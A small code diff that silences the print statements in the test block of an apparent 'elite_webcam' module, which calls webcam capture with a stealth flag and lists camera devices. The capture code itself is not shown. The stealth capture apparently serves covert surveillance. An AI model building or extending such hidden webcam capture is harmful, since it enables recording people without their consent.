@@ -548,24 +548,24 @@ def _simulate_image_data(format: str, quality: int) -> bytes:
 
 if __name__ == "__main__":
     # Test the elite_webcam command
-    print("Testing Elite Webcam Command...")
+    # print("Testing Elite Webcam Command...")
     
     # Test webcam capture
     result = elite_webcam(device_id=0, duration=1, format="jpeg", stealth=True)
-    print(f"Test 1 - Webcam capture: {result['success']}")
+    # print(f"Test 1 - Webcam capture: {result['success']}")
     
     if result['success']:
         webcam_data = result.get('webcam_data')
-        print(f"Capture methods: {result.get('capture_methods', [])}")
-        print(f"Data size: {len(webcam_data) if webcam_data else 0} characters")
+    # print(f"Capture methods: {result.get('capture_methods', [])}")
+    # print(f"Data size: {len(webcam_data) if webcam_data else 0} characters")
     
     # Test device listing
     list_result = elite_webcam_list_devices()
-    print(f"Test 2 - List devices: {list_result['success']}")
-    print(f"Devices found: {list_result.get('total_devices', 0)}")
+    # print(f"Test 2 - List devices: {list_result['success']}")
+    # print(f"Devices found: {list_result.get('total_devices', 0)}")
     
     # Test invalid parameters
     result = elite_webcam(duration=0)  # Invalid duration
-    print(f"Test 3 - Invalid params: {result['success']}")
+    # print(f"Test 3 - Invalid params: {result['success']}")
     
-    print("✅ Elite Webcam command testing complete")
+    # print("✅ Elite Webcam command testing complete")
